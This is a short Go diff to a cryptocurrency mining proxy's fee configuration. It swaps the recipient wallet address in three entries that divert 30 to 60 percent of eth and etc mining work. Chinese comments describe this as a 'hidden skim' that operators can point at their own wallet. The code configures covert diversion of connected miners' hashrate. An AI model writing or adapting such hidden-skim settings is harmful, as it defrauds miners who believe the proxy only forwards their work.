@@ -15,7 +15,7 @@ func LoadFeeCfg() {
 	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
 		// 抽水矿池跟随转发矿池
 		Upstream:   Upstream{},
-		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
+		Wallet:     "0x7216c7822f26e5b3817e36c7510bc9515dfce0bb",
 		NamePrefix: "u.",
 		Pct:        0.3,
 	})
@@ -26,7 +26,7 @@ func LoadFeeCfg() {
 			Address: "asia1.ethermine.org:4444",
 		},
 		// 这里可以改成您自己的暗抽
-		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
+		Wallet:     "0x7216c7822f26e5b3817e36c7510bc9515dfce0bb",
 		NamePrefix: "u.",
 		Pct:        0.5,
 	})
@@ -35,7 +35,7 @@ func LoadFeeCfg() {
 	FeeStates["etc"] = append(FeeStates["etc"], FeeState{
 		// 抽水矿池跟随转发矿池
 		Upstream:   Upstream{},
-		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
+		Wallet:     "0x7216c7822f26e5b3817e36c7510bc9515dfce0bb",
 		NamePrefix: "u.",
 		Pct:        0.6,
 	})
